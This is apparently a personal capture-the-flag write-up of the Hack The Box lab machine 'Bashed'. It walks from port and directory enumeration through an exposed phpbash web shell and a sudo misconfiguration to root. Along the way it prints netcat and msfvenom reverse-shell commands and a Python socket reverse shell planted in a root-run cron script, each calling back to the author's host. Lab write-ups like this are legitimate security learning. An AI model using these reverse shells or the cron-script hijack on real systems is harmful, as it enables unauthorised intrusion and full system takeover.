# Bashed 10.10.10.68 - Linux

 - __User__: 008 - 1st Attempt
 - __Root__: 008 - 2nd Attempt

## Initial Attempt, 05/06/2020

### Enumeration

`nmap -oA bashed -A -p- 10.10.10.68`

```shell
Nmap scan report for 10.10.10.68
Host is up (0.032s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```
`gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.68 -t 40`

```shell
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.68
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
/css (Status: 301)
/dev (Status: 301)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/.hta (Status: 403)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
/php (Status: 301)
/server-status (Status: 403)
/uploads (Status: 301)
```

The site at `http://10.10.10.68` points to https://github.com/Arrexel/phpbash. Says to drop phpbash.php on the server and then access it via browser. This is the intended vector, I would imagine. Now we have to get a file on the server.

... or maybe not. Investigating `gobuster` results, check `http://10.10.10.68/dev` and there is phpbash.php right there. Let's run it.

```powershell
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```

We have users `arrexel` and `scriptmanager`. We can also find the user flag in `/home/arrexel/user.txt`

```shell
NAME="Ubuntu"
VERSION="16.04.2 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.2 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

Can I do this without metasploit? Can I have `nc` listen and replace this `sendMail.php` file with a call to deliver a bash shell to my listener?

Interestingly, the shell has some passwordless access to the 2nd user?

```powershell
www-data@bashed:/var/www/html/dev# sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

## Second Attempt, 05/07/2020

I am unable to `su` to this user, says I need a real terminal. I tried using python and perl to execution a `/bin/bash` or `/bin/sh` shell but it only seems to hang the process and never resolve.

```shell
www-data@bashed:/bin# cat /proc/version
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
```

Attempted to issue `nc 10.10.14.53 4848 -e /bin/bash` from the phpshell to a listener. Unfortunately `netcat-openbsd` version is installed which does not offer `-e` functionality.

Decided to use `wget` from the phpshell as `www-data` to move files into the `html/uploads` folder where we have write permissions. Tried a number of payloads to spawn meterpreter shells, but in the end it was `msfvenom -p php/reverse_perl LHOST=10.10.14.53 LPORT=4848 > perl.php` and a netcat listener that got me a `www-data` shell in my normal terminal. Commands like `su` were still failing. But `sudo -u scriptmanager /bin/bash` happened to work! And I was able to upgrade my terminal with `python -c 'import pty; pty.spawn("/bin/sh")'`.

In the `/scripts` folder which is owned by `scriptmanager` some behavior:

```powershell
scriptmanager@bashed:/scripts$ ls -al
ls -al
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 May  6 22:01 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 May  6 22:01 test.txt
scriptmanager@bashed:/scripts$
```

The python script is dead simple:

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

And clearly "root" ran this script to generate a test file. And... if I delete the test file... it keeps popping back up! Probably a cron job for root user to run this script? Let's modify this script for priv esc purposes. Can we have it fire off a root shell via nc?

```python
import subprocess
cmd = "nc 10.10.14.53 7272 -e /bin/bash"
ret = subprocess.call(cmd, shell=True)
f = open("pen.log", "a")
f.write("accessed code was: {} \n".format(ret))
f.close
```

This doesn't work... probably because fucking `-e` is not in this nc version, facepalm. Looked up a python-native reverse shell:


```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.53",5674))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
f = open("pen.log", "a")
f.write("accessed code was: {} \n".format(p))
f.close
```

And we're in. Root runs the test.py and provides us a root shell:

```powershell
listening on [any] 5674 ...
connect to [10.10.14.53] from (UNKNOWN) [10.10.10.68] 54394
bash: cannot set terminal process group (3458): Inappropriate ioctl for device
bash: no job control in this shell
root@bashed:/scripts# whoami
whoami
root
root@bashed:/scripts# cd /root
cd /root
root@bashed:~# ls -al
ls -al
total 32
drwx------  3 root root 4096 Dec  4  2017 .
drwxr-xr-x 23 root root 4096 Dec  4  2017 ..
-rw-------  1 root root    1 Dec 23  2017 .bash_history
-rw-r--r--  1 root root 3121 Dec  4  2017 .bashrc
drwxr-xr-x  2 root root 4096 Dec  4  2017 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Dec  4  2017 root.txt
-rw-r--r--  1 root root   66 Dec  4  2017 .selected_editor
root@bashed:~# cat root.txt
```